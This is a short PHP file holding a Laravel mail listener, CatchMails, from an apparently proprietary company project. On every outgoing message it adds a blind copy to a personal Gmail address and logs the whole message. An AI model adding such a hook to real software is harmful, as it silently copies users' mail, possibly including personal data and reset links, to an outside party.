<?php

/**
 * @package App\Listeners
 * @author Claude Simo <jeanclaude.simo@abus-kransysteme.de>
 * @copyright ABUS Kransysteme GmbH
 * @license proprietary
 */

namespace App\Listeners;

use Illuminate\Mail\Events\MessageSending;
use Illuminate\Notifications\Messages\MailMessage;
use Illuminate\Support\Facades\Log;
use JetBrains\PhpStorm\NoReturn;

class CatchMails
{
    #[NoReturn] public function handle(MessageSending $event): void
    {
        $message = $event->message;

        $message->addBcc('claudesimo1990@gmail.com');

        Log::info($message);
    }
}
